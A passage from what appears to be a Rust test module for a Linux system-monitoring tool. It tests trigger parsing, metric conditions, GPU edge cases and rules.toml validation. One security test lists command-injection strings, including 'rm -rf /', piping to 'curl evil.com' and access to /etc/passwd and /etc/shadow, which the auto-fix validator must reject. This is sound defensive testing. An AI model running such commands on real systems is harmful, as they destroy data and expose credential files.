            _ => panic!("Expected CpuGreater condition"),
        }
        match &conditions[1] {
            Condition::MemGreater(val) => assert_eq!(*val, 90.0),
            _ => panic!("Expected MemGreater condition"),
        }
    }

    #[test]
    fn test_parse_trigger_process_condition() {
        let conditions = parse_trigger("process=chrome");
        assert_eq!(conditions.len(), 1);
        match &conditions[0] {
            Condition::ProcessContains(name) => assert_eq!(name, "chrome"),
            _ => panic!("Expected ProcessContains condition"),
        }
    }

    #[test]
    fn test_parse_trigger_disk_condition() {
        let conditions = parse_trigger("disk_full>90");
        assert_eq!(conditions.len(), 1);
        match &conditions[0] {
            Condition::DiskFullGreater(val) => assert_eq!(*val, 90.0),
            _ => panic!("Expected DiskFullGreater condition"),
        }
    }

    #[test]
    fn test_parse_trigger_gpu_vendor() {
        let conditions = parse_trigger("gpu_vendor=nvidia");
        assert_eq!(conditions.len(), 1);
        match &conditions[0] {
            Condition::GpuVendorEquals(vendor) => assert_eq!(vendor, "nvidia"),
            _ => panic!("Expected GpuVendorEquals condition"),
        }
    }

    #[test]
    fn test_parse_trigger_gpu_temp() {
        let conditions = parse_trigger("gpu_temp>85");
        assert_eq!(conditions.len(), 1);
        match &conditions[0] {
            Condition::GpuTempGreater(val) => assert_eq!(*val, 85.0),
            _ => panic!("Expected GpuTempGreater condition"),
        }
    }

    #[test]
    fn test_parse_trigger_complex() {
        let conditions = parse_trigger("gpu_vendor=amd && gpu_temp>80 && gpu_util>95");
        assert_eq!(conditions.len(), 3);
    }

    #[test]
    fn test_condition_holds_cpu() {
        let metrics = Metrics {
            cpu_usage: 75.0,
            mem_usage: 50.0,
            total_ram_mb: 16000,
            disk_full_percent: 50.0,
            filesystem: None,
            snap_loops: None,
            flatpak_unused: None,
            battery_drain_w: None,
            wifi_channel_count: None,
            wifi_signal_dbm: None,
            fan_speed_rpm: None,
            temperature_c: None,
            wayland_vs_x11: None,
            docker_dangling: None,
            process_names: vec![],
            process_count: 0,
            pipewire_latency_ms: None,
            firefox_soft_render: None,
            zfs_arc_full_percent: None,
            luks_device_count: None,
            gpu: None,
            prime_offload_enabled: false,
            gamescope_running: false,
            steam_running: false,
            proton_failure_detected: false,
            vulkan_loader_missing: false,
        };

        let condition = Condition::CpuGreater(60.0);
        assert!(condition_holds(&condition, &metrics, None));

        let condition = Condition::CpuGreater(80.0);
        assert!(!condition_holds(&condition, &metrics, None));
    }

    #[test]
    fn test_condition_holds_memory() {
        let metrics = Metrics {
            cpu_usage: 50.0,
            mem_usage: 85.0,
            total_ram_mb: 16000,
            disk_full_percent: 50.0,
            filesystem: None,
            snap_loops: None,
            flatpak_unused: None,
            battery_drain_w: None,
            wifi_channel_count: None,
            wifi_signal_dbm: None,
            fan_speed_rpm: None,
            temperature_c: None,
            wayland_vs_x11: None,
            docker_dangling: None,
            process_names: vec![],
            process_count: 0,
            pipewire_latency_ms: None,
            firefox_soft_render: None,
            zfs_arc_full_percent: None,
            luks_device_count: None,
            gpu: None,
            prime_offload_enabled: false,
            gamescope_running: false,
            steam_running: false,
            proton_failure_detected: false,
            vulkan_loader_missing: false,
        };

        let condition = Condition::MemGreater(80.0);
        assert!(condition_holds(&condition, &metrics, None));

        let condition = Condition::MemGreater(90.0);
        assert!(!condition_holds(&condition, &metrics, None));
    }

    #[test]
    fn test_condition_holds_process() {
        let metrics = Metrics {
            cpu_usage: 50.0,
            mem_usage: 50.0,
            total_ram_mb: 16000,
            disk_full_percent: 50.0,
            filesystem: None,
            snap_loops: None,
            flatpak_unused: None,
            battery_drain_w: None,
            wifi_channel_count: None,
            wifi_signal_dbm: None,
            fan_speed_rpm: None,
            temperature_c: None,
            wayland_vs_x11: None,
            docker_dangling: None,
            process_names: vec![
                "systemd".to_string(),
                "chrome".to_string(),
                "firefox".to_string(),
            ],
            process_count: 3,
            pipewire_latency_ms: None,
            firefox_soft_render: None,
            zfs_arc_full_percent: None,
            luks_device_count: None,
            gpu: None,
            prime_offload_enabled: false,
            gamescope_running: false,
            steam_running: false,
            proton_failure_detected: false,
            vulkan_loader_missing: false,
        };

        let condition = Condition::ProcessContains("chrome".to_string());
        assert!(condition_holds(&condition, &metrics, None));

        let condition = Condition::ProcessContains("spotify".to_string());
        assert!(!condition_holds(&condition, &metrics, None));
    }

    #[test]
    fn test_condition_holds_gpu_temp() {
        let gpu = GpuDetails {
            vendor: "nvidia".to_string(),
            model: Some("RTX 3080".to_string()),
            driver: Some("535.98".to_string()),
            temperature: Some(82.0),
            utilization: Some(95.0),
            memory_total_mb: Some(10240.0),
            memory_used_mb: Some(8192.0),
            fan_speed_percent: Some(75.0),
        };

        let metrics = Metrics {
            cpu_usage: 50.0,
            mem_usage: 50.0,
            total_ram_mb: 16000,
            disk_full_percent: 50.0,
            filesystem: None,
            snap_loops: None,
            flatpak_unused: None,
            battery_drain_w: None,
            wifi_channel_count: None,
            wifi_signal_dbm: None,
            fan_speed_rpm: None,
            temperature_c: None,
            wayland_vs_x11: None,
            docker_dangling: None,
            process_names: vec![],
            process_count: 0,
            pipewire_latency_ms: None,
            firefox_soft_render: None,
            zfs_arc_full_percent: None,
            luks_device_count: None,
            gpu: Some(gpu),
            prime_offload_enabled: false,
            gamescope_running: false,
            steam_running: false,
            proton_failure_detected: false,
            vulkan_loader_missing: false,
        };

        let condition = Condition::GpuTempGreater(80.0);
        assert!(condition_holds(&condition, &metrics, None));

        let condition = Condition::GpuTempGreater(85.0);
        assert!(!condition_holds(&condition, &metrics, None));
    }

    #[test]
    fn test_condition_holds_gpu_vendor() {
        let gpu = GpuDetails {
            vendor: "amd".to_string(),
            model: Some("RX 7900 XTX".to_string()),
            driver: Some("mesa 24.0".to_string()),
            temperature: Some(70.0),
            utilization: Some(50.0),
            memory_total_mb: Some(24576.0),
            memory_used_mb: Some(4096.0),
            fan_speed_percent: Some(60.0),
        };

        let metrics = Metrics {
            cpu_usage: 50.0,
            mem_usage: 50.0,
            total_ram_mb: 16000,
            disk_full_percent: 50.0,
            filesystem: None,
            snap_loops: None,
            flatpak_unused: None,
            battery_drain_w: None,
            wifi_channel_count: None,
            wifi_signal_dbm: None,
            fan_speed_rpm: None,
            temperature_c: None,
            wayland_vs_x11: None,
            docker_dangling: None,
            process_names: vec![],
            process_count: 0,
            pipewire_latency_ms: None,
            firefox_soft_render: None,
            zfs_arc_full_percent: None,
            luks_device_count: None,
            gpu: Some(gpu),
            prime_offload_enabled: false,
            gamescope_running: false,
            steam_running: false,
            proton_failure_detected: false,
            vulkan_loader_missing: false,
        };

        let condition = Condition::GpuVendorEquals("amd".to_string());
        assert!(condition_holds(&condition, &metrics, None));

        let condition = Condition::GpuVendorEquals("nvidia".to_string());
        assert!(!condition_holds(&condition, &metrics, None));
    }

    #[test]
    fn test_condition_holds_steam_running() {
        let metrics = Metrics {
            cpu_usage: 50.0,
            mem_usage: 50.0,
            total_ram_mb: 16000,
            disk_full_percent: 50.0,
            filesystem: None,
            snap_loops: None,
            flatpak_unused: None,
            battery_drain_w: None,
            wifi_channel_count: None,
            wifi_signal_dbm: None,
            fan_speed_rpm: None,
            temperature_c: None,
            wayland_vs_x11: None,
            docker_dangling: None,
            process_names: vec![],
            process_count: 0,
            pipewire_latency_ms: None,
            firefox_soft_render: None,
            zfs_arc_full_percent: None,
            luks_device_count: None,
            gpu: None,
            prime_offload_enabled: false,
            gamescope_running: false,
            steam_running: true,
            proton_failure_detected: false,
            vulkan_loader_missing: false,
        };

        let condition = Condition::SteamRunning(true);
        assert!(condition_holds(&condition, &metrics, None));

        let condition = Condition::SteamRunning(false);
        assert!(!condition_holds(&condition, &metrics, None));
    }

    // Security Tests
    #[test]
    fn test_is_safe_auto_fix_blocks_command_injection() {
        // Test shell metacharacter blocking
        assert!(!is_safe_auto_fix("snap remove; rm -rf /"));
        assert!(!is_safe_auto_fix("snap remove | curl evil.com"));
        assert!(!is_safe_auto_fix("snap remove && malicious"));
        assert!(!is_safe_auto_fix("snap remove `whoami`"));
        assert!(!is_safe_auto_fix("snap remove $HOME"));
        assert!(!is_safe_auto_fix("snap remove > /etc/passwd"));
        assert!(!is_safe_auto_fix("snap remove < /etc/shadow"));
        assert!(!is_safe_auto_fix("snap remove\nwhoami"));
        assert!(!is_safe_auto_fix("snap remove(malicious)"));
        assert!(!is_safe_auto_fix("snap remove{bad}"));
    }

    #[test]
    fn test_is_safe_auto_fix_allows_safe_commands() {
        // Test exact matches
        assert!(is_safe_auto_fix("bluetoothctl power off"));
        assert!(is_safe_auto_fix("bluetoothctl power on"));
        assert!(is_safe_auto_fix("balooctl"));
        assert!(is_safe_auto_fix("docker image prune"));

        // Test prefix with space (arguments)
        assert!(is_safe_auto_fix("snap remove old-package"));
        assert!(is_safe_auto_fix("flatpak uninstall com.example.App"));
        assert!(is_safe_auto_fix("systemctl --user stop baloo"));
    }

    #[test]
    fn test_is_safe_auto_fix_blocks_prefix_without_space() {
        // Malicious commands that start with whitelisted prefix but no space
        assert!(!is_safe_auto_fix("snap;malicious"));
        assert!(!is_safe_auto_fix("balooctl;evil"));
    }

    #[test]
    fn test_gpu_memory_utilization_edge_cases() {
        let gpu = GpuDetails {
            vendor: "test".into(),
            model: None,
            driver: None,
            temperature: None,
            utilization: None,
            memory_total_mb: Some(0.0),
            memory_used_mb: Some(1000.0),
            fan_speed_percent: None,
        };
        // Should return None for zero total memory
        assert_eq!(gpu.memory_utilization(), None);

        let gpu2 = GpuDetails {
            vendor: "test".into(),
            model: None,
            driver: None,
            temperature: None,
            utilization: None,
            memory_total_mb: Some(0.0001), // Very small value
            memory_used_mb: Some(100.0),
            fan_speed_percent: None,
        };
        // Should return None for values below threshold
        assert_eq!(gpu2.memory_utilization(), None);

        let gpu3 = GpuDetails {
            vendor: "test".into(),
            model: None,
            driver: None,
            temperature: None,
            utilization: None,
            memory_total_mb: Some(10240.0),
            memory_used_mb: Some(5120.0),
            fan_speed_percent: None,
        };
        // Should return proper percentage
        assert_eq!(gpu3.memory_utilization(), Some(50.0));
    }

    #[test]
    fn test_parse_trigger_empty_and_malformed() {
        // Empty string
        let conditions = parse_trigger("");
        assert_eq!(conditions.len(), 0);

        // Only whitespace
        let conditions = parse_trigger("   ");
        assert_eq!(conditions.len(), 0);

        // Malformed (no operator)
        let conditions = parse_trigger("cpu60");
        assert_eq!(conditions.len(), 0);

        // Invalid operator
        let conditions = parse_trigger("cpu<>60");
        assert_eq!(conditions.len(), 0);
    }

    // Rules Validation Tests (for CI)
    #[test]
    fn test_rules_toml_is_valid() {
        // Load rules from rules.toml
        let rules = load_rules().expect("Failed to load rules.toml - check syntax");

        // Must have at least some rules
        assert!(
            !rules.is_empty(),
            "rules.toml must contain at least one rule"
        );

        for rule in &rules {
            // Required fields must not be empty
            assert!(!rule.name.is_empty(), "Rule name cannot be empty");
            assert!(
                !rule.trigger.is_empty(),
                "Rule '{}' has empty trigger",
                rule.name
            );
            assert!(
                !rule.message.is_empty(),
                "Rule '{}' has empty message",
                rule.name
            );
            assert!(
                !rule.solution.is_empty(),
                "Rule '{}' has empty solution",
                rule.name
            );

            // Severity must be between 1 and 10
            assert!(
                rule.severity >= 1 && rule.severity <= 10,
                "Rule '{}' has invalid severity: {} (must be 1-10)",
                rule.name,
                rule.severity
            );

            // Trigger must parse to at least one condition
            let conditions = parse_trigger(&rule.trigger);
            assert!(
                !conditions.is_empty(),
                "Rule '{}' has invalid trigger: '{}' (parsed to 0 conditions)",
                rule.name,
                rule.trigger
            );

            // Auto-fix (if present) must be safe
            if let Some(ref cmd) = rule.auto_fix {
                assert!(
                    is_safe_auto_fix(cmd),
                    "Rule '{}' has unsafe auto_fix command: '{}'",
                    rule.name,
                    cmd
                );
            }

            // Message and solution should be reasonably sized
            assert!(
                rule.message.len() <= 200,
                "Rule '{}' has overly long message ({} chars, max 200)",
                rule.name,
                rule.message.len()
            );
            assert!(
                rule.solution.len() <= 500,
                "Rule '{}' has overly long solution ({} chars, max 500)",
                rule.name,
                rule.solution.len()
            );
        }
    }
}
